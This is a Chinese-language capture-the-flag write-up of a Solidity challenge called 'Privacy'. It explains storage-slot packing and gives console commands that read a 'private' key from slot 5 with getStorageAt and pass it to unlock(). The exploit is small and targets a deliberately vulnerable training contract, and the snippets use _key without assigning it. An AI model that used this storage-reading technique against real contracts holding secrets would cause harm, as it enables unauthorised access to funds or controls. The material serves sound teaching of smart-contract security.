### 第十二关 Privacy
### 难度3/5
## 这一关的通关条件是解锁这个合约。
## 代码如下：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
    */
}
```
这题和之前的Vault那一关很像，需要知道数据在插槽的位置。每个slot有32bytes即256bits，按照合约里的顺序以及如果多个值类型（value type）变量连续声明，且它们的总大小不超过32字节，Solidity会将它们打包到一个插槽中，以节省存储空间。所以，可以得知slot对应的数据是：
- slot 0 : locked
- slot 1 : ID
- slot 2 : flattening, denomination, awkwardness
- slot 3 : data[0]
- slot 4 : data[1]
- slot 5 : data[2]
可以看到我们需要的_key就存放在slot5中。
## 解题步骤：
1. 打开console，获取到_key值:
```Javascript
await web3.eth.getStorageAt(levelinstance,5);
```
2. unlock函数送入的参数将_key做了bytes16处理，所以是32个十六进制字符，我们在console中继续输入：
```Javascript
_key.slice(0,34);
```
3. 继续输入：
```Javascript
await contract.unlock(_key.slice(0,34));
```
4. 提交过关。
